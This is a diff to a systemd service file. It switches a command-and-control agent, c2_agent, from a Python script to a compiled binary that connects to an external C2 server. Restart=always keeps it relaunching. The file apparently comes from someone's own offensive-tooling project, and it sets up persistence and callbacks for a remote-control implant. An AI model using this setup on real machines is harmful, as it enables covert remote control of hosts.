@@ -4,7 +4,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/python3 /home/noob-debian/Documents/Vscode/C2/c2_agent.py --server https://c2.trazento.site
+ExecStart=/home/noob-debian/Documents/Vscode/C2/c2_agent /home/noob-debian/Documents/Vscode/C2/c2_agent --server https://c2.trazento.site
 Restart=always
 RestartSec=10
 
